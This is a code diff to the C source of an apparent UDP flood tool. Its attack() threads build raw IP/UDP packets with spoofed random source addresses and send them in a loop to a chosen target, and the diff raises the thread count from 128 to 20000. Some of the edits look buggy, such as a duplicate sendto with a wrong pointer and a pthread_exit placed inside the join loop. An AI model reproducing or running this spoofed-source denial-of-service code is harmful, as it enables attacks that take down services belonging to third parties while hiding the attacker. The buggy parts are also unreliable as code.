@@ -3,9 +3,8 @@
 #include "header/init_header.h"
 #include "header/IPs.h"
 
-
 /* 最多線程數 */
-#define MAXCHILD 128
+#define MAXCHILD 20000
 
 /* 原始套接字 */
 int sockfd;
@@ -16,27 +15,31 @@ static int alive = -1;
 char dst_ip[20] = { 0 };
 int dst_port;
 
-
 void* attack(void *addr_info){
-    struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
+    	struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
 	char buf[100], sendbuf[100];
 	int len;
 	struct iphdr ip_hdr;			//IP頭部
 	struct udphdr udp_hdr;		//UDP頭部
 	struct pseudohdr pseudoheader;	//UDP偽頭部
-
-
-	/* random seed */
-	time_t t;
-	srand((unsigned) time(&t));
+    	
 
 	len = sizeof(struct iphdr) + sizeof(struct udphdr);
 	
-	/* 初始化頭部 */
-	udp_init_header(&ip_hdr, &udp_hdr, &pseudoheader, dst_ip, dst_port);
+	/* 初始化頭部 
+	len = sizeof(struct iphdr) + sizeof(struct udphdr);*/
+	printf("len: %d", len);
+	
+	/* random seed */
+	time_t t;
+	srand((unsigned) time(&t));
+	
 	/* 處於活動狀態時持續發送包 */
 	while(alive){
-		ip_hdr.saddr = getSAddr();
+		/* 初始化頭部 */
+		udp_init_header(&ip_hdr, &udp_hdr, &pseudoheader, dst_ip, dst_port);
+		
+		ip_hdr.saddr = getSAddr();//rand();
 
 		//計算IP校驗和
 		bzero(buf, sizeof(buf));
@@ -45,16 +48,17 @@ void* attack(void *addr_info){
 
 		pseudoheader.saddr = ip_hdr.saddr;
 
-		//計算UDP校驗和
+		/*計算UDP校驗和
 		bzero(buf, sizeof(buf));
 		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
 		memcpy(buf+sizeof(pseudoheader), &udp_hdr, sizeof(struct udphdr));
-		udp_hdr.uh_sum = check_sum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct udphdr));
+		udp_hdr.uh_sum = check_sum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct udphdr));*/
 
 		bzero(sendbuf, sizeof(sendbuf));
 		memcpy(sendbuf, &ip_hdr, sizeof(struct iphdr));
 		memcpy(sendbuf+sizeof(struct iphdr), &udp_hdr, sizeof(struct udphdr));
 		printf(".");
+		sendto(sockfd, sendbuf, len, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr));
 		if (sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))< 0){
 			perror("sendto()");
 			pthread_exit("fail");
@@ -136,20 +140,19 @@ int main(int argc, char *argv[]){
 		err = pthread_create(&pthread[i], NULL, attack, (void *)&addr);
 		if(err != 0){
 			perror("pthread_create()");
-			exit(1);
+			exit(EXIT_FAILURE);
 		}
 	}
 
 	/* 等待線程结束 */
 	for(i=0; i<MAXCHILD; i++){
+		pthread_exit(NULL);
 		err = pthread_join(pthread[i], NULL);
 		if(err != 0){
 			perror("pthread_join Error\n");
-			exit(1);
+			exit(EXIT_FAILURE);
 		}
 	}
-
 	close(sockfd);
-
 	return 0;
 }
